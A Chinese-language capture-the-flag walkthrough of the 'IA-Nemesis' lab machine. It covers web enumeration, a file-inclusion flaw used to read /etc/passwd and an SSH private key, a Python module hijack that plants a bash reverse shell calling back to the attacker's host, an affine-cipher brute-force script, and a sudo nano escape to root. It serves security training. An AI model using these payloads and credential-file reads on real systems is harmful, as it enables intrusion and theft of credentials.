# 前言

靶机：`IA-Nemesis`，IP地址为`192.168.10.11`

攻击：`kali`，IP地址为`192.168.10.2`

都采用虚拟机，网卡为桥接模式

> 文章中涉及的靶场以及相关工具，在本公众号回复`IA02`即可获取

# 主机发现

因为是下载靶机到本地，所以是同一局域网，同一网段，同一网卡下，所以为求速度可以使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`

若想要模拟真实环境，可以使用`nmap`

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\2.jpg)

## 80端口网站信息探测

访问80端口的网站，其默认界面，啧，这种界面，放在现在来说，都是前后端分离的，都是纯`html`的静态界面，并且这里还有`CDN`，真实环境中还需要绕过`CDN`以获取真实的IP地址

不过这里是靶机，就没有这个步骤

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\3.jpg)

这里在查看页面源代码的时候，发现一个`php`文件，名为`contact.php`，在打开这个，并查看页面源代码时，在下面发现有意思的东西

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\4.jpg)

记住这个，继续查看，发现这个界面有链接是指向注册和登录的`html`，点击打开看一看

在注册的界面`registration.html`，并未发现内容，表单无指向`php`或`js`验证，所以这里无用

不过查看`login.html`，查看其页面源代码时，发现表单在进行点击登录时，会交给一个`js`去验证，并且搜索这个`js`函数，发现就在当前页面下的

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\6.jpg)

发现这里判断后，会跳转到一个界面的`thanoscarlos.html`，尝试直接访问，或者通过`login.html`界面输入对应的值进行登录，都会跳转。发现这个界面只有字符`website defaced`，页面源代码中也无内容，这个字符后面有个字符看不清，到底是不是`defaced`呢

不过这个是否是给出一个网站呢，后面是名称

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\7.jpg)

还是进行网站目录爆破吧，不能错过信息

使用`gobuster、ffuf、dirsearch、dirb、dirbuster`等工具爆破

```shell
gobuster dir -u http://192.168.10.12 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404,403
```

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\8.jpg)

访问`robots.txt`，发现也只有一句话，说请寻找真实的利用点



## 52845端口网站信息探测

访问`52845`端口的网站，发现也是与前面类似，不过，也能识别具有PHP，那么也直接扫描

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\9.jpg)

```shell
gobuster dir -u http://192.168.10.12:52845 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404,403
```

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\10.jpg)

访问`robots.txt`与之前一样，在界面测试功能点，都点击试试

在网站的最后，点击一个`send message`后，发现有弹窗

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\11.jpg)

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\12.jpg)

也就是我们输入的信息，会存储在一个文件中，但是当输入信息时，只是提示这个，并无返回信息

## 网站信息小结

这两个网站应该存在关联信息的，为什么这样说呢，因为在80端口的`contact`界面，页面源代码中的`php`代码，显示的是三个传参，但是在80端口的`contact`，在需要提交的是有四个必填项的。

而在`52854`端口的网站，涉及到`contact`，却正好是这三个参数，所以猜测这里可能是在进行网站复制，不过却出现问题了。

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\13.jpg)



根据前面的代码，这里是可以输出`message`的

```php
<?php
	$nam=$_GET['name'];
	$em=$_GET['email'];
	$msg=$_GET['message'];
	echo $msg;
?>
```

不过这里的输出不能是原样输出的吧，测试输入字符，确没有任何回显出现

# 漏洞利用

之前弹窗提示是，信息已被保存在一个文件中，假设在这里输入一个文件名，会有什么效果

输入`/etc/passwd`，发现有了文件信息的回显，那么就是有`php`代码对接收的信息做出了一个操作，不是直接输出，可能是和其他命令结合的

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\14.jpg)

既然可以查看这个，是否还可以查看其他的，比如这里是`nginx`和`apache`的中间件，可以测试能否查看日志相关信息，一般默认是

```shell
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

既然这种文件不行，就测试有无`ssh`的文件，前面发现的两个用户`carlos`和`thanos`

一般`ssh`公私钥文件都是在其家目录下的，名称一般默认是`id_rsa`，这是私钥的

```shell
/home/carlos/.ssh/id_rsa
/home/thanos/.ssh/id_rsa
或者
~carlos/.ssh/id_rsa
~thanos/.ssh/id_rsa
```

不过测试，发现`thanos`时，具有返回，再测试`~thanos/.ssh/id_rsa`这种方式并不支持

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\15.jpg)

# 登录thanos

把`thanos`的私钥文件，复制，然后在`kali`中粘贴在一个文件中，然后使用`ssh`登录

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\16.jpg)

在当前用户的目录下，查看`flag1`

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\17.jpg)

# 提权

## 提权至carlos

查看当前目录下的文件，发现一个所属者和所属组都是`carlos`用户的脚本文件

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\18.jpg)

通过`python`在`kali`中开启`HTTP`服务，并在靶机使用`wget`下载`pspy64`

执行后观察发现这个脚本会自动执行的，应该是任务

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\19.jpg)

查看脚本文件以及导入的模块，都没有修改权限，不过可以在同级目录下，对模块进行污染，这个词可能不是很准确，看下面的解释

>Python 首先会在当前脚本所在的目录中查找模块。如果当前目录下存在名为 `zipfile.py` 的文件，Python 会优先导入这个自定义模块

在同级目录编辑文件`zipfile.py`，并写入下面内容

```python
import os
os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'")
```

然后在`kali`中使用`nc`开启监听9999端口，等待一分钟，即可连接

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\20.jpg)

查看当前用户目录下的`flag2`

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\21.jpg)

## 提权至root

再查看`root.txt`，这里提示，经过加密的

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\22.jpg)

还提示在原始密码中，有`FUN`，查看`encrypt.py`，发现其中的加密方式为  仿射加密

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\23.jpg)

使用`ai`帮助生成一个解密代码，因为原始密码中有`FUN`所以，以这个进行筛选暴力破解出 的密码

```python
def egcd(a, b):
    x, y, u, v = 0, 1, 1, 0
    while a!= 0:
        q, r = b // a, b % a
        m, n = x - u * q, y - v * q
        b, a, x, y, u, v = a, r, u, v, m, n
    gcd = b
    return gcd, x, y

def modinv(a, m):
    gcd, x, y = egcd(a, m)
    if gcd!= 1:
        return None
    else:
        return x % m

def affine_encrypt(text, key):
    return ''.join([chr(((key[0] * (ord(t) - ord('A')) + key[1]) % 26) + ord('A')) for t in text.upper().replace(' ', '')])

def affine_decrypt(cipher, key):
    inv_key = modinv(key[0], 26)
    if inv_key is None:
        return None
    return ''.join([chr(((inv_key * (ord(c) - ord('A') - key[1])) % 26) + ord('A')) for c in cipher])

def brute_force_decrypt(cipher):
    for key0 in range(1, 26):
        if egcd(key0, 26)[0] == 1:
            for key1 in range(26):
                key = [key0, key1]
                decrypted_text = affine_decrypt(cipher, key)
                if decrypted_text and 'FUN' in decrypted_text:
                    print(f"Possible key: {key}, Decrypted text: {decrypted_text}")

def main():
    affine_encrypted_text = "FAJSRWOXLAXDQZAWNDDVLSU"
    brute_force_decrypt(affine_encrypted_text)

if __name__ == '__main__':
    main()
```

然后执行脚本，即可发现密码`ENCRYPTIONISFUNPASSWORD`

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\24.jpg)

以为这个密码是`root`的，可以直接到最后了。

测试发现是当前用户`carlos`的，在`ssh`登录的地方切换为`carlos`用户，因为在这里可以使用补全。。。。

使用`find`寻找具有SUID权限文件，发现有`sudo`，尝试`sudo -l`，发现是执行`nano`打开某个文件

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\25.jpg)

若不了解该提权，可以借助网站`gtfobins.github.io`查看

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\26.jpg)

```shell
sudo /bin/nano /opt/priv
^R^X		#这里是ctrl+R   和  ctrl+X
reset; bash 1>&0 2>&0
```

处于这时，执行命令，然后就会提权到`root`

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\27.jpg)

切换到`/root`，并查看最终`flag`

![](D:\stu\vulnhub\IA靶场\Nemesis-pic\28.jpg)



# 总结

该靶场考察以下几点：

1. 网站的比较，这里是进行网站复制时，存在一个文件包含漏洞，不过这里的数据包是`POST`的，但是这里我没有抓取数据包分析，而是直接进行对比网站以及提示存放在文件，进行的测试
2. 了解一般用户的`ssh`公私钥等的存放位置，以及默认名称
3. 对于`python`调用模块时，其实是调用`py`文件，不过一般是从库里直接调用。但是还是会先从同级目录进行调用，若没有，再从库调用
4. `pspy64`的使用，可以查看到很多看不到的
5. 对于仿射加密的了解，虽然这里可以直接借助`ai`识别，并进行生成破解的代码，但是还是要去了解下
6. 对于`sudo`提权的一些方法











